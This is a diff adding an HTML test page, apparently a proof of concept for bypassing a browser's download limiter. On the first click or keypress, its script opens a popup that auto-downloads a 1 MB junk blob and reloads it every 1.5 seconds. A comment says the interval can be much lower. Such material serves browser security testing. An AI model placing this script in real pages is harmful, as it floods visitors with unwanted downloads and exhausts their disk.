@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Test page</title>
+    </head>
+    <body><h1>Download limiter test - Reload</h1></body>
+
+    <a href='data:text/plain,'></a>
+    <script>
+      var junk_blob = new Blob([new ArrayBuffer(1024 * 1024)]);
+      var junk_url = URL.createObjectURL(junk_blob);
+
+      var payload = '<script>var link = document.createElement("a"); link.download = "test"; link.href = "' + junk_url + '"; link.click();</scr' + 'ipt>';
+
+        var payload_blob = new Blob([payload], {type: "text/html"});
+        var payload_url = URL.createObjectURL(payload_blob);
+        var exploit;
+
+        var start_exploit = function() {
+          self.removeEventListener("mousedown", start_exploit);
+          self.removeEventListener("keydown", start_exploit);
+          exploit = open(payload_url);
+
+          setInterval(function() {
+            exploit.location.reload();
+          }, 1500); // I chose a 1.5s interval but it can be much lower
+        };
+
+        self.addEventListener("mousedown", start_exploit);
+        self.addEventListener("keydown", start_exploit);
+      </script>
+</html>
